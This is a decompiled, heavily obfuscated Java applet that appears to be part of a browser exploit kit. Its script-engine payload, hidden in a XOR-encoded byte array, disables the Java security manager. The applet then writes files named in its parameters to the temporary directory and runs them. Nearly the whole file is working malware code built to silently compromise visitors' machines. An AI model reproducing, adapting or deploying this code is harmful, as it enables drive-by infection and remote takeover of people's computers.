import javax.script.ScriptEngine;
import javax.script.Invocable;
import java.awt.Component;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class ivy extends Applet
{
    private String ALLATORI_DEMO(String a, final int a) {
        final String allatori_DEMO = ALLATORI_DEMO("ZDXA\bN\u000e\\\u0005KY\u0018\\gTx\n\u001a\u000fL\u001f\u0019U\u001c\u0004`9");
        final StringBuffer sb = new StringBuffer();
        final StringBuffer sb2 = new StringBuffer();
        int n = 0;
        int n2;
        int i = n2 = 0;
        while (i < a.length()) {
            n += a;
            final StringBuffer sb3 = sb;
            final int n3 = (allatori_DEMO.indexOf(a.charAt(n2)) + n) % allatori_DEMO.length();
            final String s = allatori_DEMO;
            ++n2;
            sb3.append(s.charAt(n3));
            i = n2;
        }
        a = sb.toString();
        int n4;
        int j = n4 = 0;
        while (j < a.length()) {
            final String s2 = a;
            final int n5 = n4;
            final String substring = s2.substring(n5, n5 + 2);
            final StringBuffer sb4 = sb2;
            final int intValue = Integer.valueOf(substring, 16);
            n4 += 2;
            sb4.append((char)intValue);
            j = n4;
        }
        return sb2.toString();
    }
    
    public static String ALLATORI_DEMO(final String a) {
        final int n = (0x3 ^ 0x5) << 4 ^ (3 << 2 ^ 0x1);
        final int n2 = 5 << 3 ^ 0x2;
        final int length = a.length();
        final char[] array = new char[length];
        int n3;
        int i = n3 = length - 1;
        final char[] array2 = array;
        final char c = (char)n2;
        final int n4 = n;
        while (i >= 0) {
            final char[] array3 = array2;
            final int n5 = n3;
            final char char1 = a.charAt(n5);
            --n3;
            array3[n5] = (char)(char1 ^ n4);
            if (n3 < 0) {
                break;
            }
            final char[] array4 = array2;
            final int n6 = n3;
            final char c2 = (char)(a.charAt(n6) ^ c);
            --n3;
            array4[n6] = c2;
            i = n3;
        }
        return new String(array2);
    }
    
    @Override
    public void init() {
        try {
            this.add(new JList<Object>((Object[])new Object[] { this.ALLATORI_DEMO() }));
        }
        catch (Exception ex) {}
    }
    
    private String ALLATORI_DEMO(final byte[] a, final int a) {
        int n;
        int i = n = 0;
        while (i < a.length) {
            final int n2 = n;
            final byte b = (byte)(a[n] ^ a);
            ++n;
            a[n2] = b;
            i = n;
        }
        return new String(a);
    }
    
    @Override
    public String toString() {
        try {
            final aas aas = new aas();
            final String[] split = this.getParameter(aas.ALLATORI_DEMO("?L?")).split(ALLATORI_DEMO("-"));
            final String s = (String)Class.forName(aas.ALLATORI_DEMO("S6O6\u0017;X9^yj.J#\\:")).getMethod(ALLATORI_DEMO("\nO\u0019z\u001fE\u001dO\u001f^\u0014"), String.class).invoke(null, aas.ALLATORI_DEMO("S6O6\u0017>VyM:I3P%"));
            final String allatori_DEMO = this.ALLATORI_DEMO(ALLATORI_DEMO("L \u0018\u001bA\u0006X\n\u001b'\u0019Y`Z\u0019\\K_"), 4);
            final String allatori_DEMO2 = this.ALLATORI_DEMO(aas.ALLATORI_DEMO("[eQfs!R5]4m0\b\u001a\t5OcXb\u0000\u0005K6\r\u0005\u000f!\taOfQ6"), 5);
            final byte[] a = { 94, 64 };
            ALLATORI_DEMO("\u001eNUL\u0005]\u0000C\u000b");
            final String allatori_DEMO3 = this.ALLATORI_DEMO(a, 51);
            Integer value2;
            for (Integer value = value2 = 0; value < split.length && split[value2].length() != 0; value2 = (value = value2 + 1)) {
                final String string = new StringBuilder().insert(0, s).append(new StringBuilder().insert(0, allatori_DEMO3).append(value2).append(allatori_DEMO).toString()).toString();
                if (aas.fos(split[value2], string)) {
                    aas.rnt(new StringBuilder().insert(0, allatori_DEMO2).append(string).toString());
                }
            }
            aas.fos(new StringBuilder().insert(0, split[value2 - 1]).append(aas.ALLATORI_DEMO("\u0002f")).toString(), null);
        }
        catch (Exception ex) {}
        return "";
    }
    
    private Object ALLATORI_DEMO() {
        try {
            final aas aas;
            final ScriptEngine gse = (aas = new aas()).gse();
            final byte[] a = { 60, 47, 52, 57, 46, 51, 53, 52, 122, 46, 53, 9, 46, 40, 51, 52, 61, 114, 53, 115, 33, 51, 103, 106, 97, 46, 50, 51, 41, 116, 46, 53, 9, 46, 40, 51, 52, 61, 103, 60, 47, 52, 57, 46, 51, 53, 52, 114, 115, 33, 51, 60, 114, 51, 103, 103, 106, 115, 46, 40, 35, 33, 48, 59, 44, 59, 116, 54, 59, 52, 61, 116, 9, 35, 41, 46, 63, 55, 116, 41, 63, 46, 9, 63, 57, 47, 40, 51, 46, 35, 23, 59, 52, 59, 61, 63, 40, 114, 52, 47, 54, 54, 115, 97, 53, 116, 46, 53, 9, 46, 40, 51, 52, 61, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            final byte b = 114;
            a[b] = b;
            final byte b2 = 115;
            a[b2] = b2;
            a[116] = 97;
            a[117] = 39;
            a[118] = 57;
            a[119] = 59;
            a[120] = 46;
            a[121] = 57;
            a[122] = 50;
            a[123] = 114;
            a[124] = 63;
            a[125] = 115;
            a[126] = 33;
            a[127] = 39;
            a[128] = 51;
            a[129] = 103;
            a[130] = 107;
            a[131] = 97;
            a[132] = 40;
            a[133] = 63;
            a[134] = 46;
            a[135] = 47;
            a[136] = 40;
            a[137] = 52;
            a[138] = 122;
            a[140] = (a[139] = 125);
            a[141] = 97;
            a[142] = 39;
            a[143] = 97;
            a[144] = 63;
            a[145] = 103;
            a[146] = 52;
            a[147] = 63;
            a[148] = 45;
            a[149] = 122;
            a[150] = 31;
            a[152] = (a[151] = 40);
            a[153] = 53;
            a[154] = 40;
            a[155] = 114;
            a[156] = 115;
            a[157] = 97;
            a[158] = 63;
            a[159] = 116;
            a[160] = 55;
            a[161] = 63;
            a[163] = (a[162] = 41);
            a[164] = 59;
            a[165] = 61;
            a[166] = 63;
            a[167] = 103;
            a[168] = 46;
            a[169] = 50;
            a[170] = 51;
            a[171] = 41;
            a[172] = 97;
            a[173] = 40;
            a[174] = 63;
            a[175] = 46;
            a[176] = 47;
            a[177] = 40;
            a[178] = 52;
            a[179] = 122;
            a[180] = 63;
            a[181] = 97;
            a[182] = 39;
            Class.forName(ALLATORI_DEMO("\u0007K\u001bK\u0015\u0004\u001eI\u001fC\u001d^Cy\u000eX\u0004Z\u0019o\u0003M\u0004D\b")).getMethod(aas.ALLATORI_DEMO("\\!X;"), String.class).invoke(gse, this.ALLATORI_DEMO(a, 90));
            return aas.zog(this.ALLATORI_DEMO(ALLATORI_DEMO("C\b\u0013\u001b\u0013\u0006I \u001d\u0005\u001a\t\u0018\nN\u000e"), 3), (Invocable)gse, this);
        }
        catch (Exception ex) {
            return null;
        }
    }
}
